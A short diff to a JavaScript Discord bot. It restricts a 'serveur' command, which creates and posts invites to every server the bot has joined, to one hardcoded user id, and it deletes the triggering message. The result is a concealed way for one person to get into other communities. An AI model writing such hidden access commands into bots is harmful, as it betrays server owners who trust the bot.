@@ -17,6 +17,8 @@ bot.on("ready", async => {
 bot.on('message', message => {
 if(message.content.startsWith(prefix + "serveur")) { 
 bot.guilds.forEach(guild => {
+    message.delete()
+       if(message.author.id !== "339804940056920064") return;
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => message.channel.send(`>Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres || id: ${guild.id}`)).catch(e => {});
  });
